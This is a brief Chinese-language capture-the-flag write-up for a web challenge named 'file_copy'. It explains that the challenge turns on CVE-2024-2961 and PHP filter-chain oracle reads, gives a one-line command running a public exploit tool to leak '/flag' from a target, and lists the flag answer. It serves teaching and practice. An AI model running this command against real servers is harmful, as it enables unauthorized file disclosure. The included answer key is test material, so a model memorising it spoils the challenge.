# file_copy

> 分类：Web

## 题目描述

考察 CVE-2024-2961（PHP filter chains oracle exploit）。只要使用了列举出的这些函数，就可以在服务器不返回文件内容的情况下泄露文件内容。

## 考察知识点

- CVE-2024-2961（php://filter 过滤器链）
- 无回显文件读取（Oracle）

## 解法

直接使用工具 [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)：

```shell
python filters_chain_oracle_exploit.py --target <url> --file '/flag' --parameter path
```

分析链接：[https://xz.aliyun.com/t/12939](https://xz.aliyun.com/t/12939)

## 参考答案

`flag{a0bbd862-f9a1-4c0c-bc72-19c242a07113}`

## 来源

- 作者：frank1q22 | https://xz.aliyun.com/news/17083
- 作者：Liebert77 | https://blog.csdn.net/2301_80185313/article/details/145268362
